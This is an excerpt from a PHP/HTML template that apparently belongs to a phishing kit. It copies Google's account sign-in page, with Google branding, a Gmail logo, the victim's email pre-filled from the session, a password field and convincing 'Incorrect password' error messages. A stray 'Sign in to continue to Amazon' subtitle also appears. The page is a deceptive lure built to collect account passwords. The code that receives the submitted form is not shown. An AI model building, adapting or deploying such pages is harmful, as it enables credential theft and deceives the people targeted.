...
<div class="banner">
<h1><?= enc('One account. All of Google.'); ?></h1>
  <h2 class="hidden-small"><?= enc('Sign in to continue to Amazon'); ?></h2>
</div>
...
<div class="card signin-card pre-shift no-name">
  ...
  <center>
    <img src="https://logodownload.org/wp-content/uploads/2018/03/gmail-logo-3.png" width="100">
  </center>
  <label><center><?= enc($_SESSION['email']); ?></center></label>
  <br>
        <?php
        if ($two_email == "on") {
  ...
  <span jsslot="" style="color: red;"><?= enc('Incorrect password. Try again or click Forgot password to reset.'); ?></span>
  <?php } } ?>
  </div>
  </div>
  <span role="alert" class="error-msg" id="errormsg_0_Email">
  </span>
  </div>
...
<input id="next" name="signIn" class="rc-button rc-button-submit" type="submit" value="Next">
  <a class="need-help"><?= enc('Need help?'); ?></a>
  </div>
  </div>
  <a href="#" tabindex="-1">
...
<input name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in">
  ...
  <span><?= enc('Stay signed in'); ?></span>
  <div class="bubble-wrap" role="tooltip">
  <div class="bubble-pointer"></div>
  <div class="bubble">
  <?= enc('For your convenience, keep this checked. On shared devices, additional precautions are recommended.'); ?>
  <a><?= enc('Learn more'); ?></a>
  </div>
  </div>
  </label>
  
  <a id="link-forgot-passwd" class="need-help"><?= enc('Forgot password?'); ?></a>
  </div>
  </div>
  <span id="inge" style="display: none" role="alert" class="error-msg">
  <?= enc("Sorry, Google doesn't recognize that email."); ?> <a><?= enc('Create an account'); ?></a> <?= enc('using that address?'); ?>
  </span>
  <span id="timeoutError" style="display: none" role="alert" class="error-msg">
  <?= enc('Something went wrong. Check your connection and try again.'); ?>
  </span>
  </form>
</div>
  ...
  <a href="#">
  <?= enc('Sign in with a different account'); ?>
  </a>
  </span>
  <span id="link-signup">
  <a href="#">
...
<p class="tagline">
  <?= enc('One Google Account for everything Google'); ?>
</p>
